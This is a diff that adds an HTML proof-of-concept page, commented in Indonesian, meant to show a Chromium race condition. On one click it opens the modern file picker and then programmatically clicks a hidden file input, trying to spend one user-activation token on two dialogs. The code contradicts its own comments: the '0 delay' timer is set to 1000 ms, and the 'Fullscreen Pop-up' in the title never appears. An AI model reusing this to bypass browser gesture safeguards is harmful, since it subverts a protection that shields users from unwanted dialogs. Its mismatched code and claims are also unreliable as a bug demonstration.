@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Chromium Race Condition PoC - Fullscreen Pop-up</title>
+</head>
+<body style="height: 100vh; background: #eee;">
+    <h1>Click Once - Tested on Chrome Latest</h1>
+    <input type="file" id="sysDialog" style="display:none">
+    
+    <script>
+        const sysDialog = document.getElementById('sysDialog');
+        
+      document.body.onclick = async () => {
+    // Pengaturan opsi untuk membatasi jenis file pada dialog modern
+    const pickerOptions = {
+        types: [{
+            description: 'Text Files',
+            accept: { 'text/plain': ['.txt'] }
+        }],
+        multiple: false
+    };
+
+    try {
+        console.log("[PoC] Mengesekusi Step 1: Memanggil Modern File Picker API");
+        
+        // Step 1: Memanggil showOpenFilePicker (Mengonsumsi User Activation Token awal)
+        // Fungsi ini mengembalikan Promise asinkronus
+        const fileHandlesPromise = window.showOpenFilePicker(pickerOptions);
+
+        // Step 2: Race Condition Trigger via setTimeout (0 delay)
+        // Mencoba memicu elemen input file tradisional sebelum Promise Step 1 selesai
+        setTimeout(() => {
+            console.log("[PoC] Mengeksekusi Step 2: Memicu klik pada elemen input file tradisional");
+            sysDialog.click();
+        }, 1000);
+
+        // Menunggu hasil dari Step 1 (jika browser mengizinkan eksekusi paralel)
+        const fileHandles = await fileHandlesPromise;
+        console.log("File berhasil dipilih:", fileHandles);
+
+    } catch (err) {
+        // Mencatat apakah browser memblokir salah satu API karena masalah aktivasi token
+        console.error("Eksekusi dibatalkan atau diblokir oleh browser:", err.name, "->", err.message);
+    }
+};
+    </script>
+</body>
+</html>
